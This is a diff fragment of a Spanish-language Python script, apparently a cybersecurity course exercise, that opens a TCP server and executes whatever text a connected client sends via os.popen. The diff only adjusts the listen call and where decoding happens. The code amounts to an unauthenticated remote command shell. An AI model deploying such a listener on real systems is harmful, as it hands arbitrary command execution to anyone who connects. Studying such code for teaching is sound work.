@@ -26,22 +26,21 @@ print(colored(" ANDRES HERNANDEZ MATA | CIBERSEGURIDAD | LSTI \n", 'yellow', att
 try:
     TCPServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     TCPServerSocket.bind(servidor)
-    TCPServerSocket.listen(5)
+    TCPServerSocket.listen()
     print("[+] Iniciado Servidor...")
     while True:    
         cliente, direccion = TCPServerSocket.accept()
         print("[+] Direccion ", direccion)          
         while True:        
-            comando = cliente.recv(bufferSize)
-            if comando == b"exit":
+            comando = cliente.recv(bufferSize).decode()
+            if comando == "exit":
                 cliente.close()
                 print("[+] Cerrando Conexion...")            
                 print("[+] Saliendo...")
                 print("[-] Bye...")            
                 sys.exit()                       
             else:
-                print("[+] Recibiendo Comando...") 
-                comando = comando.decode()    
+                print("[+] Recibiendo Comando...")  
                 salida = os.popen(comando)
                 print("[+] Ejecutando " + Fore.GREEN + comando + Style.RESET_ALL)  
                 salida = salida.read()
